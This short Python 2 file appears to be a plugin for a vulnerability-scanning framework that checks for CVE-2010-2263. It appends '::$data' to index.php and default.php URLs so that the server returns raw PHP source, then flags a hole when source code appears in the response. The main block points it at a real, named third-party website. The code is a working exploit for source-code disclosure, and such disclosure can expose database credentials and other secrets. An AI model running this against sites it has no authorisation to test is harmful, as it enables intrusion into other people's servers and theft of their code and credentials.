#!/usr/bin/env python
#-*- encoding:utf-8 -*-
#__author__ = '0x3D'
#CVE: 2010-2263
import urlparse
import re
def assign(service, arg):
    if service == 'www':
        arr = urlparse.urlparse(arg)
        return True, '%s://%s/' % (arr.scheme, arr.netloc)

def audit(arg):
    url = arg
    payloads = ['index.php','default.php']
    code, head, noexistbody, error, _ = curl.curl(arg+'noexistpagenoexistpage.php::$data')
    for payload in payloads:
        payload +='::$data'
        addr = url + payload
        code, head, body, error, _ = curl.curl(addr)
        if code == 200:
            m = re.findall(r'<\?(php|)(.*?)\?>',body)
            for x in m:
                if x[1] in noexistbody:
                    continue
                if x[0]=='php':
                    security_hole(addr)
                    break
                if '$' in x[1] or 'include' in x[1]:
                    security_hole(addr)
                    break
                        

if __name__ == '__main__':
    from dummy import *
    audit(assign('www', 'http://wap.ganji.com/')[1])